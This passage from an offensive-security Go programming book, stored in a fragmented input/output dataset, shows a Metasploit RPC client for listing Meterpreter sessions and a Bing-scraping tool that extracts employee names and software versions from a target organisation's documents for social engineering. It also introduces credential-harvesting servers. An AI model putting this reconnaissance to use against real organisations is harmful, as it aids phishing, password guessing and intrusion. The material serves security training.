you’ll\nfind that this is an authentication token, issued upon successful\nlogin to the RPC server. The response returned from\nMetasploit for the session.list method follows this format:\n{\n\"1\" => {\n'type' => \"shell\",\n\"tunnel_local\" => \"192.168.35.149:44444\",\n\"tunnel_peer\" => \"192.168.35.149:43886\",\n\"via_exploit\" => \"exploit/multi/handler\",\n\"via_payload\" => \"payload/windows/shell_reverse_tcp\",\n\"desc\" => \"Command shell\",\n\"info\" => \"\",\n\"workspace\" => \"Project1\",\n\"target_host\" => \"\",\n\"username\" => \"root\",\n\"uuid\" => \"hjahs9kw\",\n\"exploit_uuid\" => \"gcprpj2a\",\n\"routes\" => [ ]\n}\n}\nThis response is returned as a map: the Meterpreter session\nidentifiers are the keys, and the session detail is the value.\nLet’s build the Go types to handle both the request and\nresponse data. Listing 3-13 defines the sessionListReq and\nSessionListRes.\n❶ type sessionListReq struct {\n❷ _msgpack struct{} `msgpack:\",asArray\"`\nMethod string\nToken string\n}\n❸ type SessionListRes struct {\nID uint32 `msgpack:\",omitempty\"`❹\nType string `msgpack:\"type\"`\nTunnelLocal string `msgpack:\"tunnel_local\"`\nTunnelPeer string `msgpack:\"tunnel_peer\"`\nViaExploit string `msgpack:\"via_exploit\"`\nViaPayload string `msgpack:\"via_payload\"`\nDescription string `msgpack:\"desc\"`\nInfo string `msgpack:\"info\"`\nWorkspace string `msgpack:\"workspace\"`\nSessionHost string `msgpack\"session_host\"`\nSessionPort int `msgpack\"session_port\"`\nUsername string `msgpack:\"username\"`\nUUID string `msgpack:\"uuid\"`\nExploitUUID string `msgpack:\"exploit_uuid\"`\n}\nListing 3-13: Metasploit session list type definitions (/ch-3/metasploit-\nminimal/rpc/msf.go)\nYou use the request type, sessionListReq ❶, to serialize\nstructured data to the MessagePack format in a manner\nconsistent with what the Metasploit RPC server expects—\nspecifically, with a method name and token value. Notice that\nthere aren’t any descriptors for those fields. The data is passed\nas an array, not a map, so rather than expecting data in\nkey/value format, the RPC interface expects the data as a\npositional array of values. This is why you omit annotations\nfor those properties—no need to define the key names.\nHowever, by default, a structure will be encoded as a map with\nthe key names deduced from the property names. To disable\nthis and force the encoding as a positional array, you add a\nspecial field named _msgpack that utilizes the asArray descriptor\n❷, to explicitly instruct an encoder/decoder to treat the data as\nan array.\nThe SessionListRes type ❸ contains a one-to-one mapping\nbetween response field and struct properties. The data, as\nshown in the preceding example response, is essentially a\nnested map. The outer map is the session identifier to session\ndetails, while the inner map is the session details, represented\nas key/value pairs. Unlike the request, the response isn’t\nstructured as a positional array, but each of the struct\nproperties uses descriptors to explicitly name and map the data\nto and from Metasploit’s representation. The code includes the\nsession identifier as a property on the struct. However, because\nthe actual value of the identifier is the key value, this will be\npopulated in a slightly different manner, so you include the\nomitempty descriptor ❹ to make the data optional so that it\ndoesn’t impact encoding or decoding. This flattens the data so\nyou don’t have to work with nested maps.\nRetrieving a Valid Token\nNow, you have only one thing outstanding. You have to\nretrieve a valid token value to use for that request. To do so,\nyou’ll issue a login request for the auth.login() API method,\nwhich expects the following:\n[\"auth.login\", \"username\", \"password\"]\nYou need to replace the username and password values with\nwhat you used when loading the msfrpc module in Metasploit\nduring initial setup (recall that you set them as environment\nvariables). Assuming authentication is successful, the server\nHivaNetwork.Com\nresponds with the following message, which contains an\nauthentication token you can use for subsequent requests.\n{ \"result\" => \"success\", \"token\" => \"a1a1a1a1a1a1a1a1\" }\nAn authentication failure produces the following response:\n{\n\"error\" => true,\n\"error_class\" => \"Msf::RPC::Exception\",\n\"error_message\" => \"Invalid User ID or Password\"\n}\nFor good measure, let’s also create functionality to expire\nthe token by logging out. The request takes the method name,\nthe authentication token, and a third optional parameter that\nyou’ll ignore because it’s unnecessary for this scenario:\n[ \"auth.logout\", \"token\", \"logoutToken\"]\nA successful response looks like this:\n{ \"result\" => \"success\" }\nDefining Request and Response Methods\nMuch as you structured the Go types for the session.list()\nmethod’s request and response, you need to do the same for\nboth auth.login() and auth.logout() (see Listing 3-14). The same\nreasoning applies as before, using descriptors to force requests\nto be serialized as arrays and for the responses to be treated as\nmaps:\ntype loginReq struct {\n_msgpack struct{} `msgpack:\",asArray\"`\nMethod string\nUsername string\nPassword string\n}\ntype loginRes struct {\nResult string `msgpack:\"result\"`\nToken string `msgpack:\"token\"`\nError bool `msgpack:\"error\"`\nErrorClass string `msgpack:\"error_class\"`\nErrorMessage string `msgpack:\"error_message\"`\n}\ntype logoutReq struct {\n_msgpack struct{} `msgpack:\",asArray\"`\nMethod string\nToken string\nLogoutToken string\n}\ntype logoutRes struct {\nResult string `msgpack:\"result\"`\n}\nListing 3-14: Login and logout Metasploit type definition (/ch-3/metasploit-\nminimal/rpc/msf.go)\nIt’s worth noting that Go dynamically serializes the login\nresponse, populating only the fields present, which means you\ncan represent both successful and failed logins by using a\nsingle struct format.\nCreating a Configuration Struct and an RPC\nMethod\nIn Listing 3-15, you take the defined types and actually use\nthem, creating the necessary methods to issue RPC commands\nto Metasploit. Much as in the Shodan example, you also define\nan arbitrary type for maintaining pertinent configuration and\nauthentication information. That way, you won’t have to\nexplicitly and repeatedly pass in common elements such as\nhost, port, and authentication token. Instead, you’ll use the\ntype and build methods on it so that data is implicitly\navailable.\ntype Metasploit struct {\nhost string\nuser string\npass string\ntoken string\n}\nfunc New(host, user, pass string) *Metasploit {\nmsf := &Metasploit{\nhost: host,\nuser: user,\npass: pass,\n}\nreturn msf\n}\nListing 3-15: Metasploit client definition (/ch-3/metasploit-minimal/rpc/msf.go)\nNow you have a struct and, for convenience, a function\nnamed New() that initializes and returns a new struct.\nPerforming Remote Calls\nYou can now build methods on your Metasploit type in order to\nperform the remote calls. To prevent extensive code\nduplication, in Listing 3-16, you start by building a method\nthat performs the serialization, deserialization, and HTTP\ncommunication logic. Then you won’t have to include this\nlogic in every RPC function you build.\nfunc (msf *Metasploit) send(req interface{}, res interface{})❶ error {\nbuf := new(bytes.Buffer)\n❷ msgpack.NewEncoder(buf).Encode(req)\n❸ dest := fmt.Sprintf(\"http://%s/api\", msf.host)\nr, err := http.Post(dest, \"binary/message-pack\", buf)❹\nif err != nil {\nreturn err\n}\ndefer r.Body.Close()\nif err := msgpack.NewDecoder(r.Body).Decode(&res)❺; err != nil {\nreturn err\n}\nreturn nil\n}\nListing 3-16: Generic send() method with reusable serialization and deserialization\n(/ch-3/metasploit-minimal/rpc/msf.go)\nThe send() method receives request and response parameters\nof type interface{} ❶. Using this interface type allows you to\npass any request struct into the method, and subsequently\nserialize and send the request to the server. Rather than\nexplicitly returning the response, you’ll use the res interface{}\nparameter to populate its data by writing a decoded HTTP\nresponse to its location in memory.\nNext, use the msgpack library to encode the request ❷. The\nlogic to do this matches that of other standard, structured data\ntypes: first create an encoder via NewEncoder() and then call the\nEncode() method. This populates the buf variable with\nMessagePack-encoded representation of the request struct.\nFollowing the encoding, you build the destination URL by\nusing the data within the Metasploit receiver, msf ❸. You use that\nURL and issue a POST request, explicitly setting the content\ntype to binary/message-pack and setting the body to the serialized\ndata ❹. Finally, you decode the response body ❺. As alluded\nto earlier, the decoded data is written to the memory location\nof the response interface that was passed into the method. The\nencoding and decoding of data is done without ever needing to\nexplicitly know the request or response struct types, making\nthis a flexible, reusable method.\nIn Listing 3-17, you can see the meat of the logic in all its\nglory.\nfunc (msf *Metasploit) Login()❶ error {\nctx := &loginReq{\nMethod: \"auth.login\",\nUsername: msf.user,\nPassword: msf.pass,\n}\nvar res loginRes\nif err := msf.send(ctx, &res)❷; err != nil {\nreturn err\n}\nmsf.token = res.Token\nreturn nil\n}\nfunc (msf *Metasploit) Logout()❸ error {\nctx := &logoutReq{\nMethod: \"auth.logout\",\nToken: msf.token,\nLogoutToken: msf.token,\n}\nvar res logoutRes\nif err := msf.send(ctx, &res)❹; err != nil {\nreturn err\n}\nmsf.token = \"\"\nreturn nil\n}\nfunc (msf *Metasploit) SessionList()❺ (map[uint32]SessionListRes, error) {\nreq := &SessionListReq{Method: \"session.list\", Token: msf.token}\n❻ res := make(map[uint32]SessionListRes)\nif err := msf.send(req, &res)❼; err != nil {\nreturn nil, err\n}\n❽ for id, session := range res {\nsession.ID = id\nres[id] = session\n}\nreturn res, nil\n}\nListing 3-17: Metasploit API calls implementation (/ch-3/metasploit-\nminimal/rpc/msf.go)\nYou define three methods: Login() ❶, Logout() ❸, and\nSessionList() ❺. Each method uses the same general flow: create\nand initialize a request struct, create the response struct, and\ncall the helper function ❷❹❼ to send the request and receive\nthe decoded response. The Login() and Logout() methods\nmanipulate the token property. The only significant difference\nbetween method logic appears in the SessionList() method, where\nyou define the response as a map[uint32]SessionListRes ❻ and loop\nover that response to flatten the map ❽, setting the ID property\non the struct rather than maintaining a map of maps.\nRemember that the session.list() RPC function requires a valid\nauthentication token, meaning you have to log in before the\nSessionList() method call will succeed. Listing 3-18 uses the\nMetasploit receiver struct to access a token, which isn’t a valid\nvalue yet—it’s an empty string. Since the code you’re\ndeveloping here isn’t fully featured, you could just explicitly\ninclude a call to your Login() method from within the SessionList()\nmethod, but for each additional authenticated method you\nimplement, you’d have to check for the existence of a valid\nauthentication token and make an explicit call to Login(). This\nisn’t great coding practice because you’d spend a lot of time\nrepeating logic that you could write, say, as part of a\nbootstrapping process.\nYou’ve already implemented a function, New(), designed to\nbe used for bootstrapping, so patch up that function to see\nwhat a new implementation looks like when including\nauthentication as part of the process (see Listing 3-18).\nfunc New(host, user, pass string) (*Metasploit, error)❶ {\nmsf := &Metasploit{\nhost: host,\nuser: user,\npass: pass,\n}\nif err := msf.Login()❷; err != nil {\nreturn nil, err\n}\nreturn msf, nil\n}\nListing 3-18: Initializing the client with embedding Metasploit login (/ch-\n3/metasploit-minimal/rpc/msf.go)\nThe patched-up code now includes an error as part of the\nreturn value set ❶. This is to alert on possible authentication\nfailures. Also, added to the logic is an explicit call to the Login()\nmethod ❷. As long as the Metasploit struct is instantiated using\nthis New() function, your authenticated method calls will now\nhave access to a valid authentication token.\nCreating a Utility Program\nNearing the end of this example, your last effort is to create\nthe utility program that implements your shiny new library.\nEnter the code in Listing 3-19 into client/main.go, run it, and\nwatch the magic happen.\npackage main\nimport (\n\"fmt\"\n\"log\"\n\"github.com/blackhat-go/bhg/ch-3/metasploit-minimal/rpc\"\n)\nfunc main() {\nhost := os.Getenv(\"MSFHOST\")\npass := os.Getenv(\"MSFPASS\")\nuser := \"msf\"\nif host == \"\" || pass == \"\" {\nlog.Fatalln(\"Missing required environment variable MSFHOST or\nMSFPASS\")\n}\nmsf, err := rpc.New(host, user, pass)❶\nif err != nil {\nlog.Panicln(err)\n}\n❷ defer msf.Logout()\nsessions, err := msf.SessionList()❸\nif err != nil {\nlog.Panicln(err)\n}\nfmt.Println(\"Sessions:\")\n❹ for _, session := range sessions {"
  },
  {
    "input": "Parsing Document Metadata with Bing Scraping",
    "output": "fmt.Printf(\"%5d %s\\n\", session.ID, session.Info)\n}\n}\nListing 3-19: Consuming our msfrpc package (/ch-3/metasploit-\nminimal/client/main.go)\nFirst, bootstrap the RPC client and initialize a new Metasploit\nstruct ❶. Remember, you just updated this function to perform\nauthentication during initialization. Next, ensure you do proper\ncleanup by issuing a deferred call to the Logout() method ❷.\nThis will run when the main function returns or exits. You then\nissue a call to the SessionList() method ❸ and iterate over that\nresponse to list out the available Meterpreter sessions ❹.\nThat was a lot of code, but fortunately, implementing other\nAPI calls should be substantially less work since you’ll just be\ndefining request and response types and building the library\nmethod to issue the remote call. Here’s sample output\nproduced directly from our client utility, showing one\nestablished Meterpreter session:\n$ go run main.go\nSessions:\n1 WIN-HOME\\jsmith @ WIN-HOME\nThere you have it. You’ve successfully created a library\nand client utility to interact with a remote Metasploit instance\nto retrieve the available Meterpreter sessions. Next, you’ll\nventure into search engine response scraping and document\nmetadata parsing.\nPARSING DOCUMENT METADATA\nWITH BING SCRAPING\nWITH BING SCRAPING\nAs we stressed in the Shodan section, relatively benign\ninformation—when viewed in the correct context—can prove\nto be critical, increasing the likelihood that your attack against\nan organization succeeds. Information such as employee\nnames, phone numbers, email addresses, and client software\nversions are often the most highly regarded because they\nprovide concrete or actionable information that attackers can\ndirectly exploit or use to craft attacks that are more effective\nand highly targeted. One such source of information,\npopularized by a tool named FOCA, is document metadata.\nApplications store arbitrary information within the\nstructure of a file saved to disk. In some cases, this can include\ngeographical coordinates, application versions, operating\nsystem information, and usernames. Better yet, search engines\ncontain advanced query filters that allow you to retrieve\nspecific files for an organization. The remainder of this\nchapter focuses on building a tool that scrapes—or as my\nlawyer calls it, indexes—Bing search results to retrieve a\ntarget organization’s Microsoft Office documents,\nsubsequently extracting relevant metadata.\nSetting Up the Environment and Planning\nBefore diving into the specifics, we’ll start by stating the\nobjectives. First, you’ll focus solely on Office Open XML\ndocuments—those ending in xlsx, docx, pptx, and so on.\nAlthough you could certainly include legacy Office data types,\nthe binary formats make them exponentially more\ncomplicated, increasing code complexity and reducing\nreadability. The same can be said for working with PDF files.\nAlso, the code you develop won’t handle Bing pagination,\nHivaNetwork.Com\ninstead only parsing initial page search results. We encourage\nyou to build this into your working example and explore file\ntypes beyond Open XML.\nWhy not just use the Bing Search APIs for building this,\nrather than doing HTML scraping? Because you already know\nhow to build clients that interact with structured APIs. There\nare practical use cases for scraping HTML pages, particularly\nwhen no API exists. Rather than rehashing what you already\nknow, we’ll take this as an opportunity to introduce a new\nmethod of extracting data. You’ll use an excellent package,\ngoquery, which mimics the functionality of jQuery, a JavaScript\nlibrary that includes an intuitive syntax to traverse HTML\ndocuments and select data within. Start by installing goquery:\n$ go get github.com/PuerkitoBio/goquery\nFortunately, that’s the only prerequisite software needed to\ncomplete the development. You’ll use standard Go packages\nto interact with Open XML files. These files, despite their file\ntype suffix, are ZIP archives that, when extracted, contain\nXML files. The metadata is stored in two files within the\ndocProps directory of the archive:\n$ unzip test.xlsx\n$ tree\n--snip--\n|---docProps\n| |---app.xml\n| |---core.xml\n--snip—\nThe core.xml file contains the author information as well as\nmodification details. It’s structured as follows:\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n<cp:coreProperties\nxmlns:cp=\"http://schemas.openxmlformats.org/package/2006/metadata\n/core-properties\"\nxmlns:dc=\"http://purl.org/dc/elements/1.1/\"\nxmlns:dcterms=\"http://purl.org/dc/terms/\"\nxmlns:dcmitype=\"http://purl.org/dc/dcmitype/\"\nxmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">\n<dc:creator>Dan Kottmann</dc:creator>❶\n<cp:lastModifiedBy>Dan Kottmann</cp:lastModifiedBy>❷\n<dcterms:created\nxsi:type=\"dcterms:W3CDTF\">2016-12-06T18:24:42Z</dcterms:created>\n<dcterms:modified\nxsi:type=\"dcterms:W3CDTF\">2016-12-06T18:25:32Z</dcterms:modified>\n</cp:coreProperties>\nThe creator ❶ and lastModifiedBy ❷ elements are of primary\ninterest. These fields contain employee or usernames that you\ncan use in a social-engineering or password-guessing\ncampaign.\nThe app.xml file contains details about the application type\nand version used to create the Open XML document. Here’s\nits structure:\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n<Properties\nxmlns=\"http://schemas.openxmlformats.org/officeDocument/2006/extended-properties\"\nxmlns:vt=\"http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes\">\n<Application>Microsoft Excel</Application>❶\n<DocSecurity>0</DocSecurity>\n<ScaleCrop>false</ScaleCrop>\n<HeadingPairs>\n<vt:vector size=\"2\" baseType=\"variant\">\n<vt:variant>\n<vt:lpstr>Worksheets</vt:lpstr>\n</vt:variant>\n<vt:variant>\n<vt:i4>1</vt:i4>\n</vt:variant>\n</vt:vector>\n</HeadingPairs>\n<TitlesOfParts>\n<vt:vector size=\"1\" baseType=\"lpstr\">\n<vt:lpstr>Sheet1</vt:lpstr>\n</vt:vector>\n</TitlesOfParts>\n<Company>ACME</Company>❷\n<LinksUpToDate>false</LinksUpToDate>\n<SharedDoc>false</SharedDoc>\n<HyperlinksChanged>false</HyperlinksChanged>\n<AppVersion>15.0300</AppVersion>❸\n</Properties>\nYou’re primarily interested in just a few of those elements:\nApplication ❶, Company ❷, and AppVersion ❸. The version itself\ndoesn’t obviously correlate to the Office version name, such as\nOffice 2013, Office 2016, and so on, but a logical mapping\ndoes exist between that field and the more readable,\ncommonly known alternative. The code you develop will\nmaintain this mapping.\nDefining the metadata Package\nIn Listing 3-20, define the Go types that correspond to these\nXML datasets in a new package named metadata and put the\ncode in a file named openxml.go—one type for each XML file\nyou wish to parse. Then add a data mapping and convenience\nfunction for determining the recognizable Office version that\ncorresponds to the AppVersion.\ntype OfficeCoreProperty struct {\nXMLName xml.Name `xml:\"coreProperties\"`\nCreator string `xml:\"creator\"`\nLastModifiedBy string `xml:\"lastModifiedBy\"`\n}\ntype OfficeAppProperty struct {\nXMLName xml.Name `xml:\"Properties\"`\nApplication string `xml:\"Application\"`\nCompany string `xml:\"Company\"`\nVersion string `xml:\"AppVersion\"`\n}\nvar OfficeVersions❶ = map[string]string{\n\"16\": \"2016\",\n\"15\": \"2013\",\n\"14\": \"2010\",\n\"12\": \"2007\",\n\"11\": \"2003\",\n}\nfunc (a *OfficeAppProperty) GetMajorVersion()❷ string {\ntokens := strings.Split(a.Version, \".\")❸\nif len(tokens) < 2 {\nreturn \"Unknown\"\n}\nv, ok := OfficeVersions❹ [tokens[0]]\nif !ok {\nreturn \"Unknown\"\n}\nreturn v\n}\nListing 3-20: Open XML type definition and version mapping (/ch-3/bing-\nmetadata/metadata/openxml.go)\nAfter you define the OfficeCoreProperty and OfficeAppProperty\ntypes, define a map, OfficeVersions, that maintains a relationship\nof major version numbers to recognizable release years ❶. To\nuse this map, define a method, GetMajorVersion(), on the\nOfficeAppProperty type ❷. The method splits the XML data’s\nAppVersion value to retrieve the major version number ❸,\nsubsequently using that value and the OfficeVersions map to\nretrieve the release year ❹.\nMapping the Data to Structs\nNow that you’ve built the logic and types to work with and\ninspect the XML data of interest, you can create the code that\nreads the appropriate files and assigns the contents to your\nstructs. To do this, define NewProperties() and process() functions,\nas shown in Listing 3-21.\nfunc NewProperties(r *zip.Reader) (*OfficeCoreProperty, *OfficeAppProperty,\nerror) {❶\nvar coreProps OfficeCoreProperty\nvar appProps OfficeAppProperty\nfor _, f := range r.File {❷\nswitch f.Name {❸\ncase \"docProps/core.xml\":\nif err := process(f, &coreProps)❹; err != nil {\nreturn nil, nil, err\n}\ncase \"docProps/app.xml\":\nif err := process(f, &appProps)❺; err != nil {\nreturn nil, nil, err\n}\ndefault:\ncontinue\n}\n}\nreturn &coreProps, &appProps, nil\n}\nfunc process(f *zip.File, prop interface{}) error {❻\nrc, err := f.Open()\nif err != nil {\nreturn err\n}\ndefer rc.Close()\nif err := ❼xml.NewDecoder(rc).Decode(&prop); err != nil {\nreturn err\n}\nreturn nil\n}\nListing 3-21: Processing Open XML archives and embedded XML documents (/ch-\n3/bing-metadata/metadata/openxml.go)\nThe NewProperties() function accepts a *zip.Reader, which\nrepresents an io.Reader for ZIP archives ❶. Using the zip.Reader\ninstance, iterate through all the files in the archive ❷,\nchecking the filenames ❸. If a filename matches one of the\ntwo property filenames, call the process() function ❹❺, passing\nin the file and the arbitrary structure type you wish to populate\n—either OfficeCoreProperty or OfficeAppProperty.\nThe process() function accepts two parameters: a *zip.File and\nan interface{} ❻. Similar to the Metasploit tool you developed,\nthis code accepts a generic interface{} type to allow for the file\ncontents to be assigned into any data type. This increases code\nreuse because there’s nothing type-specific within the process()\nfunction. Within the function, the code reads the contents of\nthe file and unmarshals the XML data into the struct ❼.\nSearching and Receiving Files with Bing\nYou now have all the code necessary to open, read, parse, and\nextract Office Open XML documents, and you know what you\nneed to do with the file. Now, you need to figure out how to\nsearch for and retrieve files by using Bing. Here’s the plan of\naction you should follow:\n1. Submit a search request to Bing with proper filters to retrieve targeted results.\n2. Scrape the HTML response, extracting the HREF (link) data to obtain direct\nURLs for documents.\n3. Submit an HTTP request for each direct document URL\n4. Parse the response body to create a zip.Reader\n5. Pass the zip.Reader into the code you already developed to extract metadata.\nThe following sections discuss each of these steps in order.\nThe first order of business is to build a search query\ntemplate. Much like Google, Bing contains advanced query\nparameters that you can use to filter search results on\nnumerous variables. Most of these filters are submitted in a\nfilter_type: value format. Without explaining all the available filter\ntypes, let’s instead focus on what helps you achieve your goal.\nThe following list contains the three filters you’ll need. Note\nthat you could use additional filters, but at the time of this\nwriting, they behave somewhat unpredictably.\nsite Used to filter the results to a specific domain\nfiletype Used to filter the results based off resource file type\ninstreamset Used to filter the results to include only certain\nfile extensions\nAn example query to retrieve docx files from nytimes.com\nwould look like this:\nsite:nytimes.com && filetype:docx && instreamset:(url title):docx\nAfter submitting that query, take a peek at the resulting\nURL in your browser. It should resemble Figure 3-1.\nAdditional parameters may appear after this, but they’re\ninconsequential for this example, so you can ignore them.\nNow that you know the URL and parameter format, you\ncan see the HTML response, but first you need to determine\nwhere in the Document Object Model (DOM) the document\nlinks reside. You can do this by viewing the source code\ndirectly, or limit the guesswork and just use your browser’s\ndeveloper tools. The following image shows the full HTML\nelement path to the desired HREF. You can use the element\ninspector, as in Figure 3-1, to quickly select the link to reveal\nits full path.\nFigure 3-1: A browser developer tool showing the full element path\nWith that path information, you can use goquery to\nsystematically pull all data elements that match an HTML\npath. Enough talk! Listing 3-22 puts it all together: retrieving,\nscraping, parsing, and extracting. Save this code to main.go.\n❶ func handler(i int, s *goquery.Selection) {\nurl, ok := s.Find(\"a\").Attr(\"href\")❷\nif !ok {\nreturn\n}\nfmt.Printf(\"%d: %s\\n\", i, url)\nres, err := http.Get(url)❸\nif err != nil {\nreturn\n}\nbuf, err := ioutil.ReadAll(res.Body)❹\nif err != nil {\nreturn\n}\ndefer res.Body.Close()\nr, err := zip.NewReader(bytes.NewReader(buf)❺, int64(len(buf)))\nif err != nil {\nreturn\n}\ncp, ap, err := metadata.NewProperties(r)❻\nif err != nil {\nreturn\n}\nlog.Printf(\n\"%25s %25s - %s %s\\n\",\ncp.Creator,\ncp.LastModifiedBy,\nap.Application,\nap.GetMajorVersion())\n}\nfunc main() {\nif len(os.Args) != 3 {\nlog.Fatalln(\"Missing required argument. Usage: main.go domain ext\")\n}\ndomain := os.Args[1]\nfiletype := os.Args[2]\n❼ q := fmt.Sprintf(\n\"site:%s && filetype:%s && instreamset:(url title):%s\",\nHivaNetwork.Com\ndomain,\nfiletype,\nfiletype)\n❽ search := fmt.Sprintf(\"http://www.bing.com/search?q=%s\",\nurl.QueryEscape(q))\ndoc, err := goquery.NewDocument(search)❾\nif err != nil {\nlog.Panicln(err)\n}\ns := \"html body div#b_content ol#b_results li.b_algo div.b_title h2\"\n❿ doc.Find(s).Each(handler)\n}\nListing 3-22: Scraping Bing results and parsing document metadata (/ch-3/bing-\nmetadata/client/main.go)\nYou create two functions. The first, handler(), accepts a\ngoquery.Selection instance ❶ (in this case, it will be populated\nwith an anchor HTML element) and finds and extracts the href\nattribute ❷. This attribute contains a direct link to the\ndocument returned from the Bing search. Using that URL, the\ncode then issues a GET request to retrieve the document ❸.\nAssuming no errors occur, you then read the response body\n❹, leveraging it to create a zip.Reader ❺. Recall that the\nfunction you created earlier in your metadata package,\nNewProperties(), expects a zip.Reader. Now that you have the\nappropriate data type, pass it to that function ❻, and\nproperties are populated from the file and printed to your\nscreen.\nThe main() function bootstraps and controls the whole\nprocess; you pass it the domain and file type as command line\narguments. The function then uses this input data to build the\nBing query with the appropriate filters ❼. The filter string is\nencoded and used to build the full Bing search URL ❽. The\nsearch request is sent using the goquery.NewDocument() function,\nwhich implicitly makes an HTTP GET request and returns a\ngoquery-friendly representation of the HTML response\ndocument ❾. This document can be inspected with goquery.\nFinally, use the HTML element selector string you identified\nwith your browser developer tools to find and iterate over\nmatching HTML elements ❿. For each matching element, a\ncall is made to your handler() function.\nA sample run of the code produces output similar to the\nfollowing:\n$ go run main.go nytimes.com docx\n0:\nhttp://graphics8.nytimes.com/packages/pdf/2012NAIHSAnnualHIVReport041713.docx\n2020/12/21 11:53:50 Jonathan V. Iralu Dan Frosch - Microsoft Macintosh\nWord 2010\n1: http://www.nytimes.com/packages/pdf/business/Announcement.docx\n2020/12/21 11:53:51 agouser agouser - Microsoft Office Outlook 2007\n2: http://www.nytimes.com/packages/pdf/business/DOCXIndictment.docx\n2020/12/21 11:53:51 AGO Gonder, Nanci - Microsoft Office Word\n2007\n3: http://www.nytimes.com/packages/pdf/business/BrownIndictment.docx\n2020/12/21 11:53:51 AGO Gonder, Nanci - Microsoft Office Word\n2007\n4: http://graphics8.nytimes.com/packages/pdf/health/Introduction.docx\n2020/12/21 11:53:51 Oberg, Amanda M Karen Barrow - Microsoft\nMacintosh Word 2010\nYou can now search for and extract document metadata for\nall Open XML files while targeting a specific domain. I\nencourage you to expand on this example to include logic to\nnavigate multipage Bing search results, to include other file\ntypes beyond Open XML, and to enhance the code to"
  },
  {
    "input": "Summary",
    "output": "concurrently download the identified files.\nSUMMARY\nThis chapter introduced to you fundamental HTTP concepts in\nGo, which you used to create usable tools that interacted with\nremote APIs, as well as to scrape arbitrary HTML data. In the\nnext chapter, you’ll continue with the HTTP theme by learning\nto create servers rather than clients."
  },
  {
    "input": "4 HTTP SERVERS, ROUTING, AND MIDDLEWARE",
    "output": "4\nHTTP SERVERS, ROUTING, AND\nMIDDLEWARE\nIf you know how to write HTTP servers from scratch, you can\ncreate customized logic for social engineering, command-and-\ncontrol (C2) transports, or APIs and frontends for your own\ntools, among other things. Luckily, Go has a brilliant standard\npackage—net/http—for building HTTP servers; it’s really all\nyou need to effectively write not only simple servers, but also\ncomplex, full-featured web applications.\nIn addition to the standard package, you can leverage third-\nparty packages to speed up development and remove some of\nthe tedious processes, such as pattern matching. These\npackages will assist you with routing, building middleware,\nvalidating requests, and other tasks.\nIn this chapter, you’ll first explore many of the techniques\nneeded to build HTTP servers using simple applications. Then\nyou’ll deploy these techniques to create two social engineering\napplications—a credential-harvesting server and a keylogging\nserver—and multiplex C2 channels."
  },
  {
    "input": "HTTP Server Basics",
    "output": "HTTP SERVER BASICS\nIn this section, you’ll explore the net/http package and useful\nthird-party packages by building simple servers, routers, and\nmiddleware. We’ll expand on these basics to cover more\nnefarious examples later in the chapter.\nBuilding a Simple Server\nThe code in Listing 4-1 starts a server that handles requests to\na single path. (All the code listings at the root location of /\nexist under the provided github repo\nhttps://github.com/blackhat-go/bhg/.) The server should locate\nthe name URL parameter containing a user’s name and respond\nwith a customized greeting.\npackage main\nimport (\n\"fmt\"\n\"net/http\"\n)\nfunc hello(w http.ResponseWriter, r *http.Request) {\nfmt.Fprintf(w, \"Hello %s\\n\", r.URL.Query().Get(\"name\"))\n}\nfunc main() {\n❶ http.HandleFunc(\"/hello\", hello)\n❷ http.ListenAndServe(\":8000\", nil)\n}\nListing 4-1: A Hello World server (/ch-4/hello_world/main.go)\nThis simple example exposes a resource at /hello. The\nresource grabs the parameter and echoes its value back to the\nclient. Within the main() function, http.HandleFunc() ❶ takes two\narguments: a string, which is a URL path pattern you’re\ninstructing your server to look for, and a function, which will\nactually handle the request. You could provide the function\ndefinition as an anonymous inline function, if you want. In this\nexample, you pass in the function named hello() that you\ndefined earlier.\nThe hello() function handles requests and returns a hello\nmessage to the client. It takes two arguments itself. The first is\nhttp.ResponseWriter, which is used to write responses to the\nrequest. The second argument is a pointer to http.Request, which\nwill allow you to read information from the incoming request.\nNote that you aren’t calling your hello() function from main().\nYou’re simply telling your HTTP server that any requests for\n/hello should be handled by a function named hello().\nUnder the covers, what does http.HandleFunc() actually do?\nThe Go documentation will tell you that it places the handler\non the DefaultServerMux. A ServerMux is short for a server\nmultiplexer, which is just a fancy way to say that the\nunderlying code can handle multiple HTTP requests for\npatterns and functions. It does this using goroutines, with one\ngoroutine per incoming request. Importing the net/http package\ncreates a ServerMux and attaches it to that package’s namespace;\nthis is the DefaultServerMux.\nThe next line is a call to http.ListenAndServe() ❷, which takes a\nstring and an http.Handler as arguments. This starts an HTTP\nserver by using the first argument as the address. In this case,\nthat’s :8000, which means the server should listen on port 8000\nacross all interfaces. For the second argument, the http.Handler,\nyou pass in nil. As a result, the package uses DefaultServerMux as\nthe underlying handler. Soon, you’ll be implementing your\nown http.Handler and will pass that in, but for now you’ll just use\nthe default. You could also use http.ListenAndServeTLS(), which\nwill start a server using HTTPS and TLS, as the name\ndescribes, but requires additional parameters.\nImplementing the http.Handler interface requires a single\nmethod: ServeHTTP(http.ResponseWriter, *http.Request). This is great\nbecause it simplifies the creation of your own custom HTTP\nservers. You’ll find numerous third-party implementations that\nextend the net/http functionality to add features such as\nmiddleware, authentication, response encoding, and more.\nYou can test this server by using curl:\n$ curl -i http://localhost:8000/hello?name=alice\nHTTP/1.1 200 OK\nDate: Sun, 12 Jan 2020 01:18:26 GMT\nContent-Length: 12\nContent-Type: text/plain; charset=utf-8\nHello alice\nExcellent! The server you built reads the name URL\nparameter and replies with a greeting.\nBuilding a Simple Router\nNext you’ll build a simple router, shown in Listing 4-2, that\ndemonstrates how to dynamically handle inbound requests by\ninspecting the URL path. Depending on whether the URL\ncontains the path /a, /b, or /c, you’ll print either the message\nExecuting /a, Executing /b, or Executing /c. You’ll print a 404 Not Found\nerror for everything else.\npackage main\nimport (\n\"fmt\"\n\"net/http\"\n)\n❶ type router struct {\n}\n❷ func (r *router) ServeHTTP(w http.ResponseWriter, req *http.Request) {\n❸ switch req.URL.Path {\ncase \"/a\":\nfmt.Fprint(w, \"Executing /a\")\ncase \"/b\":\nfmt.Fprint(w, \"Executing /b\")\ncase \"/c\":\nfmt.Fprint(w, \"Executing /c\")\ndefault:\nhttp.Error(w, \"404 Not Found\", 404)\n}\n}\nfunc main() {\nvar r router\n❹ http.ListenAndServe(\":8000\", &r)\n}\nListing 4-2: A simple router 